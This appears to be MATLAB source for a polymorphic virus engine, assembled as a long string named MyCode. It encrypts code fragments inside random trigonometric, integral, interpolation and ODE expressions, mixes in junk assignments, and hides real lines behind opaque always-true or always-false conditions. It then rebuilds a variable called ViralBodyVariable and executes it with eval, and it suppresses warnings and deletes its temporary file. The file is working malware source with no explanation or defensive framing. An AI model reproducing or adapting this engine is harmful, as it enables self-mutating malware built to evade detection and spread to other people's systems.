MyCode=[MyCode 'CreateTrashA=[''if(rand<EncryptThreshold)OrigString2Enc=CodePart{fix(rand*SplitSize+1)};eval(GiveEncString);TrashString=[''''char('''' EncryString '''')''''];OrigString2Enc=char(fix(rand(1,fix(rand*7)+3)*25)+97);eval(GiveEncString);GarbageString=[''''char('''' EncryString '''')''''];else GarbageString=['''''''''''''''' char(fix(rand(1,fix(rand*7)+3)*25)+97) ''''''''''''''''];TrashString=['''''''''''''''' strrep(CodePart{fix(rand*SplitSize+1)},'''''''''''''''','''''''''''''''''''''''') ''''''''''''''''];end;if(max(sum(AlgoMatrix))>0.05*SplitSize)TrashNames=Rnames(diag(AlgoMatrix));end;tmp=rand;tn=fix(rand*(length(TrashNames)-1)+1);tmpord=randperm(length(TrashNames));''];CreateTrashB=[''if(tmp>0.9) TrashLine{end+1}=[Rnames{fix(rand*SplitSize+1)} '',QuoteSign,''='',QuoteSign,'',TrashString,'',QuoteSign,'';'',QuoteSign,''];else''];CreateTrashC=[''if(tmp>0.7 && length(TrashNames)) TrashLine{end+1}=[TrashNames{tn},'',QuoteSign,''=['',QuoteSign,'',TrashNames{tn},'',QuoteSign,'' '',QuoteSign,'',TrashString,'',QuoteSign,''];'',QuoteSign,''];''];CreateTrashC=[CreateTrashC ''elseif(tmp>0.5 && length(TrashNames)>2) TrashLine{end+1}=[TrashNames{tmpord(1)},'',QuoteSign,''=['',QuoteSign,'',TrashNames{tmpord(2)},'',QuoteSign,'' '',QuoteSign,'',TrashNames{tmpord(1)},'',QuoteSign,''];'',QuoteSign,''];''];CreateTrashC=[CreateTrashC ''elseif(tmp>0.3 && length(TrashNames)>2) TrashLine{end+1}=[TrashNames{tmpord(1)},'',QuoteSign,''=['',QuoteSign,'',TrashNames{tmpord(1)},'',QuoteSign,'' '',QuoteSign,'',TrashNames{tmpord(2)},'',QuoteSign,''];'',QuoteSign,''];''];CreateTrashC=[CreateTrashC ''elseif(tmp>0.1 && length(TrashNames)) TrashLine{end+1}=[TrashNames{tn},'',QuoteSign,''=['',QuoteSign,'',TrashString,'',QuoteSign,'' '',QuoteSign,'',TrashNames{tn},'',QuoteSign,''];'',QuoteSign,''];''];CreateTrashD=[''else TrashLine{end+1}=[Rnames{tn},'',QuoteSign,''='',QuoteSign,'',GarbageString,'',QuoteSign,'';'',QuoteSign,''];end''];CreateTrash1=[CreateTrashA CreateTrashB CreateTrashC CreateTrashD];CreateTrash2=[CreateTrashA CreateTrashC ''else TrashLine{end+1}=[TrashNames{tn},'',QuoteSign,''=['',QuoteSign,'',TrashString,'',QuoteSign,'' '',QuoteSign,'',TrashNames{tn},'',QuoteSign,''];'',QuoteSign,''];end''];'];
MyCode=[MyCode 'GiveEncString=[''EncDiff=0;EvaledCryptArray=0;OrigString2Enc=OrigString2Enc+rand();while(EncDiff<length(OrigString2Enc)||isnan(EncDiff)||isinf(EncDiff)||sum(isnan(EvaledCryptArray))||sum(isinf(EvaledCryptArray))||sum(abs(EvaledCryptArray)>10000)||sum(abs(imag(EvaledCryptArray))))EncFReplacePool1={'',QuoteSign,''sin'',QuoteSign,'' '',QuoteSign,''cos'',QuoteSign,'' '',QuoteSign,''exp'',QuoteSign,'' '',QuoteSign,''atan'',QuoteSign,'' '',QuoteSign,''sinh'',QuoteSign,'' '',QuoteSign,''cosh'',QuoteSign,'' '',QuoteSign,''log'',QuoteSign,'' '',QuoteSign,''asin'',QuoteSign,'' '',QuoteSign,''acos'',QuoteSign,'' '',QuoteSign,''tan'',QuoteSign,''};EncSReplacePool1={ '',QuoteSign,''F(NOS)Q'',QuoteSign,'' '',QuoteSign,''F(SON)Q'',QuoteSign,'' '',QuoteSign,''F(S)Q'',QuoteSign,'' '',QuoteSign,''F(S)Q'',QuoteSign,'' '',QuoteSign,''F(SON)Q'',QuoteSign,'' '',QuoteSign,''F(NOS)Q'',QuoteSign,''};EncStartFunction=EncSReplacePool1{fix(rand*length(EncSReplacePool1)+1)};EncSReplacePool1{1}='',QuoteSign,''if'',QuoteSign,''; EncSReplacePool1{2}='',QuoteSign,''if'',QuoteSign,'';EncOReplacePool1={'',QuoteSign,''.*'',QuoteSign,'' '',QuoteSign,''+'',QuoteSign,'' '',QuoteSign,''-'',QuoteSign,''};EncQReplacePool1={'',QuoteSign,'''',QuoteSign,'' ['',QuoteSign,''.^'',QuoteSign,'' num2str(fix(rand()*5+2))] '',QuoteSign,'''',QuoteSign,'' '',QuoteSign,'''',QuoteSign,'' '',QuoteSign,'''',QuoteSign,''};while (length(strfind(EncStartFunction,'',QuoteSign,''S'',QuoteSign,''))+length(strfind(EncStartFunction,'',QuoteSign,''O'',QuoteSign,''))+length(strfind(EncStartFunction,'',QuoteSign,''F'',QuoteSign,''))>0) EncStartFunction=regexprep(EncStartFunction,'',QuoteSign,''S'',QuoteSign,'',EncSReplacePool1{fix(rand*length(EncSReplacePool1)+1)},rand*length(strfind(EncStartFunction,'',QuoteSign,''S'',QuoteSign,''))+1);EncStartFunction=regexprep(EncStartFunction,'',QuoteSign,''F'',QuoteSign,'',EncFReplacePool1{fix(rand*length(EncFReplacePool1)+1)},rand*length(strfind(EncStartFunction,'',QuoteSign,''F'',QuoteSign,''))+1);EncStartFunction=regexprep(EncStartFunction,'',QuoteSign,''O'',QuoteSign,'',EncOReplacePool1{fix(rand*length(EncOReplacePool1)+1)},rand*length(strfind(EncStartFunction,'',QuoteSign,''O'',QuoteSign,''))+1);EncStartFunction=regexprep(EncStartFunction,'',QuoteSign,''N'',QuoteSign,'',num2str(rand*10),rand*length(strfind(EncStartFunction,'',QuoteSign,''N'',QuoteSign,''))+1);EncStartFunction=regexprep(EncStartFunction,'',QuoteSign,''Q'',QuoteSign,'',EncQReplacePool1{fix(rand*length(EncQReplacePool1)+1)},rand*length(strfind(EncStartFunction,'',QuoteSign,''Q'',QuoteSign,''))+1);if(max(cumsum(EncStartFunction=='',QuoteSign,''('',QuoteSign,'')-cumsum(EncStartFunction=='',QuoteSign,'')'',QuoteSign,''))>25) EncSReplacePool1{3}=EncSReplacePool1{1};EncSReplacePool1{4}=EncSReplacePool1{1};EncSReplacePool1{5}=EncSReplacePool1{2};EncSReplacePool1{6}=EncSReplacePool1{2};end;end;EncStartFunction=regexprep(EncStartFunction,'',QuoteSign,''if'',QuoteSign,'',['',QuoteSign,''['',QuoteSign,'' num2str(100*rand(1,length(OrigString2Enc))) '',QuoteSign,'']'',QuoteSign,'' ]);EvaledCryptArray=eval(EncStartFunction);EncDiff=sum(abs(diff(fix(EvaledCryptArray))))+(length(OrigString2Enc)==1);end;if rand>0.67 CPcrypt=OrigString2Enc+EvaledCryptArray;EncryString=['',QuoteSign,''['',QuoteSign,'' num2str(CPcrypt) '',QuoteSign,'']-'',QuoteSign,'' EncStartFunction];else CPcrypt=OrigString2Enc-EvaledCryptArray;if rand>0.66 EncryString=['',QuoteSign,''['',QuoteSign,'' num2str(CPcrypt) '',QuoteSign,'']+'',QuoteSign,'' EncStartFunction];else EncryString=[EncStartFunction '',QuoteSign,''+['',QuoteSign,'' num2str(CPcrypt) '',QuoteSign,'']'',QuoteSign,''];end;end;while(strfind(EncryString,'',QuoteSign,''  '',QuoteSign,''))EncryString=strrep(EncryString,'',QuoteSign,''  '',QuoteSign,'','',QuoteSign,'' '',QuoteSign,'');end''];'];
MyCode=[MyCode 'ODEfile=fopen(''odefunction.m'',''w+'');fprintf(ODEfile,[''function status=odefunction(t,y,flagzz,args);status=0;if ~isempty(t) if ~any(abs(t-t(1))>1.e-4) status=1;end;end'']);fclose(ODEfile);rehash;EncryptThreshold=rand();if(EncryptThreshold<0.33)EncryptThreshold=0;elseif(EncryptThreshold>0.66)EncryptThreshold=1;elseEncryptThreshold=rand();end;RandPermSS=randperm(SplitSize);AlgoMatrix=false(SplitSize,SplitSize);'];
MyCode=[MyCode 'for Count000=1:SplitSize disp([num2str(Count000) ''/'' num2str(SplitSize)]);if(RandPermSS(Count000)>1)for Count001=1:SplitSize if(rand>0.4 && AlgoMatrix(RandPermSS(Count000)-1,Count001))if(rand()<EncryptThreshold)OrigString2Enc=CodePart{RandPermSS(Count000)};eval(GiveEncString);NewCode{end+1}=[Rnames{Count001},''=['',Rnames{Count001},'' char('',EncryString,'')];''];else NewCode{end+1}=[Rnames{Count001},''=['',Rnames{Count001},'' '',QuoteSign,strrep(CodePart{RandPermSS(Count000)},'''''''',''''''''''''),QuoteSign,''];''];end;AlgoMatrix(RandPermSS(Count000),Count001)=1;eval(CreateTrash1);end;end;end;if(sum(AlgoMatrix(RandPermSS(Count000),:),2)==0&&RandPermSS(Count000)<SplitSize-1)for Count002=1:SplitSize if(rand>0.4 && AlgoMatrix(RandPermSS(Count000)+1,Count002)==1)if(rand()<EncryptThreshold)OrigString2Enc=CodePart{RandPermSS(Count000)};eval(GiveEncString);NewCode{end+1}=[Rnames{Count002},''=[char('',EncryString,'') '',Rnames{Count002},''];''];else NewCode{end+1}=[Rnames{Count002},''=['',QuoteSign,strrep(CodePart{RandPermSS(Count000)},'''''''',''''''''''''),QuoteSign,'' '',Rnames{Count002},''];''];end;AlgoMatrix(RandPermSS(Count000),Count002)=1;eval(CreateTrash1);end;end;end;if(sum(AlgoMatrix(RandPermSS(Count000),:),2)==0)if(rand()<EncryptThreshold)OrigString2Enc=CodePart{RandPermSS(Count000)};eval(GiveEncString);NewCode{end+1}=[Rnames{RandPermSS(Count000)},''=[char('',EncryString,'')];''];else NewCode{end+1}=[Rnames{RandPermSS(Count000)},''='',QuoteSign,strrep(CodePart{RandPermSS(Count000)},'''''''',''''''''''''),QuoteSign,'';''];end;AlgoMatrix(RandPermSS(Count000),RandPermSS(Count000))=1;'];
MyCode=[MyCode 'TrashNames{end+1}=Rnames{RandPermSS(Count000)};eval(CreateTrash1);end;for Count003=2:SplitSize for Count004=1:SplitSize Count005=find(AlgoMatrix(Count003,:));if(~AlgoMatrix(Count003,Count004)&&AlgoMatrix(Count003-1,Count004)&&size(Count005,2)>0&&rand>0.4)if(rand>0.5)NewCode{end+1}=[Rnames{Count004},''=['',Rnames{Count004},'' '',Rnames{Count005},''];''];AlgoMatrix(:,Count004)=AlgoMatrix(:,Count004)+AlgoMatrix(:,Count005);AlgoMatrix(:,Count005)=0;eval(CreateTrash1);else NewCode{end+1}=[Rnames{Count005},''=['',Rnames{Count004},'' '',Rnames{Count005},''];''];AlgoMatrix(:,Count005)=AlgoMatrix(:,Count005)+AlgoMatrix(:,Count004);AlgoMatrix(:,Count004)=0;eval(CreateTrash1);end;end;end;end;end;while ~any(all(AlgoMatrix)) for Count006=2:SplitSize for Count007=1:SplitSize Count008=find(AlgoMatrix(Count006,:));if(~AlgoMatrix(Count006,Count007)&&AlgoMatrix(Count006-1,Count007)&&size(Count008,2)>0&&rand>0.4)if(rand>0.5)NewCode{end+1}=[Rnames{Count007},''=['',Rnames{Count007},'' '',Rnames{Count008},''];''];AlgoMatrix(:,Count007)=AlgoMatrix(:,Count007)+AlgoMatrix(:,Count008);AlgoMatrix(:,Count008)=0;TrashNames=Rnames(diag(AlgoMatrix));eval(CreateTrash2);else NewCode{end+1}=[Rnames{Count008},''=['',Rnames{Count007},'' '',Rnames{Count008},''];''];AlgoMatrix(:,Count008)=AlgoMatrix(:,Count008)+AlgoMatrix(:,Count007);AlgoMatrix(:,Count007)=0;TrashNames=Rnames(diag(AlgoMatrix));eval(CreateTrash2);end;end;end;end;end;for Count009=1:size(NewCode,2) eval(NewCode{Count009});end;ViralBodyVariable=Rnames{sum(AlgoMatrix)==SplitSize};NewCode=strrep(NewCode,ViralBodyVariable,TmpRndName{1});TrashLine=strrep(TrashLine,ViralBodyVariable,TmpRndName{1});ActualCodeForThisPart={};Var2Wrt={};ObfusCount=1;RandomAppearenceOfIfs=fix(rand*2);LineBreaksIf=fix(rand(1,4)*2);LineShift={};LineShift{1}(1:fix(rand*8))='' '';if rand>0.7 LineShift{1}=''    '';end;if rand>0.3 LineShift{2}=LineShift{1};else LineShift{2}(1:fix(rand*8))='' '';end;while(ObfusCount<=length(NewCode))Var2Wrt{ObfusCount}={};ActualCodeForThisPart{ObfusCount}={};runcode=0;RandNameCol={};for Count010=0:10 RandNameCol{end+1}=''if'';while(any(strcmp({FfAll{:} DfAll{:} Rnames{:} RandNameCol{1:end-1}},RandNameCol{end}))||iskeyword(RandNameCol{end}))RandNameCol{end}=char(fix(rand(1,fix(rand*15)+5)*25)+97);end;end;CODE=NewCode{ObfusCount};TRASH=TrashLine{ObfusCount};WhichMathAlgo=fix(rand*5);if(WhichMathAlgo==1||WhichMathAlgo==3)FReplacePool1={''sin'' ''cos'' ''exp'' ''atan''};StartFunction=''SOS'';SReplacePool1={''(SOS)'' ''F(S)'' ''if'' ''if''};while(~isempty(strfind([FReplacePool1{:}], SReplacePool1{3}))||iskeyword(SReplacePool1{3}))SReplacePool1{3}=char(fix(rand(1,fix(rand*4)+2)*25)+97);end;SReplacePool1{4}=SReplacePool1{3};OReplacePool1={''.*'' ''+''};while length(strfind(StartFunction,''S''))+length(strfind(StartFunction,''O''))+length(strfind(StartFunction,''F''))>0 TmpVar001=fix(rand*length(SReplacePool1)+1);StartFunction=regexprep(StartFunction,''S'',SReplacePool1{TmpVar001},rand*length(strfind(StartFunction,''S''))+1);if(TmpVar001>2&&strcmp(SReplacePool1{3},SReplacePool1{4}));while(~isempty(strfind(SReplacePool1{4},SReplacePool1{3}))||~isempty(strfind(SReplacePool1{3},SReplacePool1{4}))||~isempty(strfind([FReplacePool1{:}],SReplacePool1{4}))||iskeyword(SReplacePool1{4}))SReplacePool1{4}=char(fix(rand(1,fix(rand*4)+2)*25)+97);end;end;StartFunction=regexprep(StartFunction, ''O'',OReplacePool1{fix(rand*length(OReplacePool1)+1)},rand*length(strfind(StartFunction,''O''))+1);StartFunction=regexprep(StartFunction, ''F'',FReplacePool1{fix(rand*length(FReplacePool1)+1)},rand*length(strfind(StartFunction,''F''))+1);if(max(cumsum(StartFunction==''('')-cumsum(StartFunction=='')''))>25)SReplacePool1{1}=SReplacePool1{3};SReplacePool1{2}=SReplacePool1{4}; end;end;end;'];
MyCode=[MyCode 'if(WhichMathAlgo==0)MatSizeN=fix(rand*5)+3;SomeMatVec{1}=[RandNameCol{end} ''=['']; SomeMatVec{2}=[RandNameCol{end-1} ''=['']; SomeMatVec{3}=[RandNameCol{end-2} ''=[''];MultFct=rand*30;for Count011=1:MatSizeN SomeMatVec{1}=[SomeMatVec{1} '' '' num2str(rand(1,1)*MultFct)];SomeMatVec{2}=[SomeMatVec{2} '';'' num2str(rand(1,1)*MultFct)];SomeMatVec{3}=[SomeMatVec{3} '';''];for Count012=1:MatSizeN SomeMatVec{3}=[SomeMatVec{3} '' '' num2str(rand(1,1)*MultFct)];end;end;SomeMatVec{1}=[SomeMatVec{1} ''];''];SomeMatVec{1}(size(RandNameCol{end},2)+3)='''';eval(SomeMatVec{1});SomeMatVec{2}=[SomeMatVec{2} ''];''];SomeMatVec{2}(size(RandNameCol{end-1},2)+3)='''';eval(SomeMatVec{2});SomeMatVec{3}=[SomeMatVec{3} ''];''];SomeMatVec{3}(size(RandNameCol{end-2},2)+3:size(RandNameCol{end-2},2)+4)='''';eval(SomeMatVec{3});SpecMatName={''toeplitz'',''vander''}; SpecVecName={''pascal'',''magic'',''hilb'',''invhilb'',''wilkinson''};WhichMatrixAlgo=fix(rand*5);if(WhichMatrixAlgo==0)Var2Wrt{ObfusCount}{end+1}=SomeMatVec{1};Var2Wrt{ObfusCount}{end+1}=SomeMatVec{2};MatXNameXX=[RandNameCol{end-1} ''*'' RandNameCol{end}];elseif(WhichMatrixAlgo==1)Var2Wrt{ObfusCount}{end+1}=SomeMatVec{3};MatXNameXX=[RandNameCol{end-2}];elseif(WhichMatrixAlgo==2)Var2Wrt{ObfusCount}{end+1}=SomeMatVec{1};MatXNameXX=[SpecMatName{fix(rand(1,1)*length(SpecMatName)+1)} ''('' RandNameCol{end} '')''];elseif(WhichMatrixAlgo==3)MatXNameXX=[SpecVecName{fix(rand(1,1)*length(SpecVecName)+1)} ''('' num2str(MatSizeN) '')''];elseif(WhichMatrixAlgo==4)MatXNameXX=''rosser'';end;MatArOp={''sin'' ''cos'' ''sinh'' ''cosh'' ''exp'' ''tan'' ''sqrt'' ''real'' ''imag''};for Count013=1:fix(rand*3+1) if(rand>0.66)MatXNameXX=[MatArOp{fix(rand*size(MatArOp,2)+1)} ''('' MatXNameXX '')''];end;end;VecArOp={''sum'' ''max'' ''min''};SavedVector=[VecArOp{fix(rand*size(VecArOp,2)+1)} ''('' RandNameCol{end} '')''];IsItAVector=1;if(rand>0.44) SavedVector=num2str(rand*100-50); IsItAVector=0;end;for Count015=1:fix(rand*3+1) if(rand>0.66)SavedVector=[MatArOp{fix(rand*size(MatArOp,2)+1)} ''('' SavedVector '')''];end;end;MatXNameXX=[VecArOp{fix(rand*size(VecArOp,2)+1)} ''('' MatXNameXX '')''];for Count016=1:fix(rand*3+1) if(rand>0.85)MatXNameXX=[MatArOp{fix(rand*size(MatArOp,2)+1)} ''('' MatXNameXX '')''];end;end;MatXNameXX=[VecArOp{fix(rand*size(VecArOp,2)+1)} ''('' MatXNameXX '')''];for Count017=1:fix(rand*3+1) if(rand>0.85)MatXNameXX=[MatArOp{fix(rand*size(MatArOp,2)+1)} ''('' MatXNameXX '')''];end;end;TmpVar002=fix(rand*4);Operator1=''''; Operator2='''';if(eval(SavedVector)>eval(MatXNameXX)) Operator1=''>''; Operator2=''<'';end;if(eval(SavedVector)<eval(MatXNameXX)) Operator1=''<''; Operator2=''>'';end;if(~isempty(Operator1))ActualCodeForThisPart{ObfusCount}{2}=[LineShift{1} CODE];ActualCodeForThisPart{ObfusCount}{4}=[LineShift{2} TRASH];if(sum(strcmp(Var2Wrt{ObfusCount},SomeMatVec{1}))==0 && IsItAVector) Var2Wrt{ObfusCount}{end+1}=SomeMatVec{1};end;if(TmpVar002==0)ActualCodeForThisPart{ObfusCount}{1}=[''if(('' SavedVector '')'' Operator1 MatXNameXX '')''];elseif(TmpVar002==1)ActualCodeForThisPart{ObfusCount}{1}=[''if('' MatXNameXX Operator1 ''('' SavedVector ''))''];ActualCodeForThisPart{ObfusCount}{2}=[LineShift{1} TRASH];ActualCodeForThisPart{ObfusCount}{4}=[LineShift{2} CODE];elseif(TmpVar002==2)ActualCodeForThisPart{ObfusCount}{1}=[''if(('' SavedVector '')'' Operator2 MatXNameXX '')''];ActualCodeForThisPart{ObfusCount}{2}=[LineShift{1} TRASH];ActualCodeForThisPart{ObfusCount}{4}=[LineShift{2} CODE];elseif(TmpVar002==3)ActualCodeForThisPart{ObfusCount}{1}=[''if('' MatXNameXX Operator2 ''('' SavedVector ''))''];end;ActualCodeForThisPart{ObfusCount}{3}=[''else''];ActualCodeForThisPart{ObfusCount}{5}=[''end''];else ObfusCount=ObfusCount-1;end;RandNameCol(end)=[]; RandNameCol(end)=[]; RandNameCol(end)=[];if ObfusCount for Count018=1:size(Var2Wrt{ObfusCount},2) eval(Var2Wrt{ObfusCount}{Count018});end;end;elseif(WhichMathAlgo==1)BoundAll1=cellstr(num2str(rand(5,1))); BoundAll2={''pi'',''log(2)'',''sqrt(2)'',''sqrt(3)'',BoundAll1{:}}; BoundAll3=randperm(length(BoundAll2));if rand>0.6 StartFunction=strrep(StartFunction,SReplacePool1{4},SReplacePool1{3});BoundAll3={BoundAll2{BoundAll3(1:2)}};BoundSign=strrep(strrep(cellstr(num2str(rand(2,1)>0.7)),''1'',''-''),''0'',''''); BoundAll3={[BoundSign{1} strrep(BoundAll3{1},'' '','''')],[BoundSign{2} strrep(BoundAll3{2},'' '','''')]}; BoundTmpA=[eval(BoundAll3{1}) eval(BoundAll3{2})];if(sum(abs(sort(BoundTmpA)-BoundTmpA))>0) BoundAll3{3}=BoundAll3{1}; BoundAll3{1}=BoundAll3{2}; BoundAll3{2}=BoundAll3{3}; BoundAll3(3)=[];end;FctString1=''quad''; FctString2=''''; FctString3='''';else BoundAll3={BoundAll2{BoundAll3(1:4)}};BoundSign=strrep(strrep(cellstr(num2str(rand(4,1)>0.7)),''1'',''-''),''0'','''');BoundAll3={[BoundSign{1} strrep(BoundAll3{1},'' '','''')],[BoundSign{2} strrep(BoundAll3{2},'' '','''')],[BoundSign{3} strrep(BoundAll3{3},'' '','''')],[BoundSign{4} strrep(BoundAll3{4},'' '','''')]};BoundTmpA=[eval(BoundAll3{1}) eval(BoundAll3{2})];BoundTmpB=[eval(BoundAll3{3}) eval(BoundAll3{4})];if(sum(abs(sort(BoundTmpA)-BoundTmpA))>0) BoundAll3{5}=BoundAll3{1}; BoundAll3{1}=BoundAll3{2}; BoundAll3{2}=BoundAll3{5}; BoundAll3(5)=[]; end;if(sum(abs(sort(BoundTmpB)-BoundTmpB))>0) BoundAll3{5}=BoundAll3{3}; BoundAll3{3}=BoundAll3{4}; BoundAll3{4}=BoundAll3{5}; BoundAll3(5)=[]; end;FctString1=''dblquad''; FctString2=['','' BoundAll3{3} '','' BoundAll3{4}]; FctString3=['','' SReplacePool1{4}];end;IntTolerance=fix(real(log10(eval([FctString1 ''(@('' SReplacePool1{3} FctString3 '')'' StartFunction '','' BoundAll3{1} '','' BoundAll3{2} FctString2 '',1e'' num2str(6666) '')'']))))+5;TimeMeasure=0;while(TimeMeasure<0.1 && IntTolerance>-23)IntTolerance=IntTolerance-1;CompleteCompString=[FctString1 ''(@('' SReplacePool1{3} FctString3 '')'' StartFunction '','' BoundAll3{1} '','' BoundAll3{2} FctString2 '',1e'' num2str(IntTolerance) '')''];TimeMeasure=cputime;CompleteErg=eval(CompleteCompString);TimeMeasure=cputime-TimeMeasure;if(isnan(CompleteErg)||isinf(CompleteErg))IntTolerance=-50;end;end;if(IntTolerance>-23)runcode=1;else ObfusCount=ObfusCount-1;end;elseif(WhichMathAlgo==2)TmpVar003=fix(rand*50+4);TmpVar004=rand*1000;InterpDataVec='''';for Count019=0:TmpVar003 InterpDataVec=[InterpDataVec num2str(rand*TmpVar004) '' ''];end;InterpDataVec(end)='''';Var2Wrt{ObfusCount}{end+1}=[RandNameCol{end} ''=['' InterpDataVec ''];''];eval(Var2Wrt{ObfusCount}{end});InterpSpline='''';if(rand>0.6) InterpSpline=['','' QuoteSign ''spline'' QuoteSign];end;CompleteCompString=[''interp1('' RandNameCol{end} '','' num2str(rand*(TmpVar003-1)+1) InterpSpline '')''];RandNameCol(end)=[];CompleteErg=eval(CompleteCompString);runcode=1;elseif(WhichMathAlgo==3)Var2Wrt{ObfusCount}{end+1}=[RandNameCol{end} ''=inline('' QuoteSign StartFunction QuoteSign '','' QuoteSign SReplacePool1{3} QuoteSign '','' QuoteSign SReplacePool1{4} QuoteSign '');''];eval(Var2Wrt{ObfusCount}{end});ODEIntervallA=fix(rand*7-3);ODEIntervallB=fix(ODEIntervallA+rand*4+1);Var2Wrt{ObfusCount}{end+1}=[''['' RandNameCol{end-1} '','' RandNameCol{end-2} '']=ode45('' RandNameCol{end} '',['' num2str(ODEIntervallA) '' '' num2str(ODEIntervallB) ''],'' num2str(rand*4) '');''];eval([Var2Wrt{ObfusCount}{end}(1:end-2) '',odeset('' QuoteSign ''OutputFcn'' QuoteSign '',@odefunction));'']);ODEDomain=eval(RandNameCol{end-1});ODEIntX=num2str(rand*ODEIntervallB+ODEIntervallA);if rand>0.5 CompleteCompString=[''interp1('' RandNameCol{end-1} '','' RandNameCol{end-2} '','' ODEIntX '')''];else CompleteCompString=[''interp1('' Var2Wrt{ObfusCount}{end}(strfind(Var2Wrt{ObfusCount}{end},''='')+1:end-1) '','' ODEIntX '')''];Var2Wrt{ObfusCount}(end)=[];end;RandNameCol(end)=[]; RandNameCol(end)=[]; RandNameCol(end)=[];if(length(ODEDomain)>5&&ODEDomain(end)==ODEIntervallB)CompleteErg=eval(CompleteCompString);else CompleteErg=NaN;end;if(isnan(CompleteErg)||isinf(CompleteErg)||ODEDomain(end)~=ODEIntervallB)while ~isempty(Var2Wrt{ObfusCount}) Var2Wrt{ObfusCount}(end)=[];end;ObfusCount=ObfusCount-1;else runcode=1;end;elseif(WhichMathAlgo==4)CompleteCompString=''F(F(S))'';SReplacePool2={''F(S)'' ''F(S)'' ''F(S)'' ''F(S)'' ''F(S)'' ''D(S,S)'' ''R'' ''R''};while ~isempty(strfind(CompleteCompString,''S'')) CompleteCompString=regexprep(CompleteCompString, ''S'',SReplacePool2{fix(rand*length(SReplacePool2)+1)},rand*length(strfind(CompleteCompString,''S''))+1);if(length(strfind(CompleteCompString,''F''))+length(strfind(CompleteCompString,''D''))>10)SReplacePool2={''R''};end;end;CompleteCompString=regexprep(CompleteCompString, ''S'',SReplacePool2{fix(rand*length(SReplacePool2)+1)});while length(strfind(CompleteCompString,''D''))+length(strfind(CompleteCompString,''F''))+length(strfind(CompleteCompString,''R''))>0 CompleteCompString=regexprep(CompleteCompString, ''F'',FfAll{fix(rand*length(FfAll)+1)},rand*length(strfind(CompleteCompString,''F''))+1);CompleteCompString=regexprep(CompleteCompString, ''D'',DfAll{fix(rand*length(DfAll)+1)},rand*length(strfind(CompleteCompString,''D''))+1);CompleteCompString=regexprep(CompleteCompString, ''R'',num2str(rand*10-5),rand*length(strfind(CompleteCompString,''R''))+1);end;if(max(cumsum(CompleteCompString==''('')-cumsum(CompleteCompString=='')''))<25)CompleteErg=eval(CompleteCompString);else CompleteErg=NaN;end;if(isnan(CompleteErg)||isinf(CompleteErg))ObfusCount=ObfusCount-1;else runcode=1;end;end;'];
MyCode=[MyCode 'if(runcode)RCWriteVar=0;RCNumSub=''0'';RCNumAdd=''0'';while(~(CompleteErg>eval(RCNumSub))||~(eval(RCNumSub)<CompleteErg)||~(CompleteErg<eval(RCNumAdd))||~(eval(RCNumAdd)>CompleteErg))if WhichMathAlgo==3 MulFacRC=8; IncFacRC=2;else MulFacRC=0.01;IncFacRC=1;end;RCNumSub=num2str(CompleteErg-(abs(CompleteErg)*MulFacRC+IncFacRC)*rand,5+fix(rand(1,1)*5));RCNumAdd=num2str(CompleteErg+(abs(CompleteErg)*MulFacRC+IncFacRC)*rand,5+fix(rand(1,1)*5));end;if(rand>0.4)RCsSub=[RandNameCol{end} ''='' RCNumSub '';''];RCNumSub=RandNameCol{end};RCsAdd=[RandNameCol{end} ''='' RCNumAdd '';''];RCNumAdd=RandNameCol{end};RCWriteVar=1;RandNameCol(end)=[];end;ActualCodeForThisPart{ObfusCount}{2}=[LineShift{1} CODE];ActualCodeForThisPart{ObfusCount}{4}=[LineShift{2} TRASH];if(RCWriteVar) Var2Wrt{ObfusCount}{end+1}=RCsSub;eval(RCsSub);end;runcode=1;TmpVar005=fix(rand*4);'];
MyCode=[MyCode 'if(TmpVar005==0)if(rand>0.5)ActualCodeForThisPart{ObfusCount}{1}=[''if('' CompleteCompString ''>'' RCNumSub '')''];else ActualCodeForThisPart{ObfusCount}{1}=[''if('' RCNumSub ''<'' CompleteCompString '')''];end;elseif(TmpVar005==1)if(rand>0.5)ActualCodeForThisPart{ObfusCount}{1}=[''if('' CompleteCompString ''<'' RCNumSub '')''];else ActualCodeForThisPart{ObfusCount}{1}=[''if('' RCNumSub ''>'' CompleteCompString '')''];end;ActualCodeForThisPart{ObfusCount}{2}=[LineShift{1} TRASH];ActualCodeForThisPart{ObfusCount}{4}=[LineShift{2} CODE];elseif(TmpVar005==2)if(rand>0.5)ActualCodeForThisPart{ObfusCount}{1}=[''if('' CompleteCompString ''>'' RCNumAdd '')''];else ActualCodeForThisPart{ObfusCount}{1}=[''if('' RCNumAdd ''<'' CompleteCompString '')''];end;if(RCWriteVar)Var2Wrt{ObfusCount}{end}=RCsAdd;eval(RCsAdd);end;ActualCodeForThisPart{ObfusCount}{2}=[LineShift{1} TRASH];ActualCodeForThisPart{ObfusCount}{4}=[LineShift{2} CODE];elseif(TmpVar005==3)if(rand>0.5)ActualCodeForThisPart{ObfusCount}{1}=[''if('' CompleteCompString ''<'' RCNumAdd '')''];else ActualCodeForThisPart{ObfusCount}{1}=[''if('' RCNumAdd ''>'' CompleteCompString '')''];end;if(RCWriteVar)Var2Wrt{ObfusCount}{end}=RCsAdd;eval(RCsAdd);end;end;ActualCodeForThisPart{ObfusCount}{3}=''else'';ActualCodeForThisPart{ObfusCount}{5}=''end'';end;TmpVar006=4;TmpStrWS={'''' '''' '' '' '''' ''''};while TmpVar006>0 if ObfusCount if(LineBreaksIf(TmpVar006)==1&&length(ActualCodeForThisPart{ObfusCount})==5)ActualCodeForThisPart{ObfusCount}{TmpVar006}=[ActualCodeForThisPart{ObfusCount}{TmpVar006} TmpStrWS{TmpVar006} ActualCodeForThisPart{ObfusCount}{TmpVar006+1}];ActualCodeForThisPart{ObfusCount}(TmpVar006+1)=[];end;end;TmpVar006=TmpVar006-1;end;'];
MyCode=[MyCode 'if(RandomAppearenceOfIfs)LineBreaksIf=fix(rand(1,4)*2);LineShift={};LineShift{1}(1:fix(rand*8))='' '';if rand>0.7 LineShift{1}=''    '';end;if rand>0.4 LineShift{2}=LineShift{1};else LineShift{2}(1:fix(rand*8))='' '';end;end;ObfusCount=ObfusCount+1;end;Var2Wrt{1}{end+1}=''warning off all'';delete(''odefunction.m'');'];
MyCode=[MyCode 'ActualCodeForThisPart{end+1}={[''eval('' TmpRndName{1} '');'']};Var2Wrt{end+1}={};'];
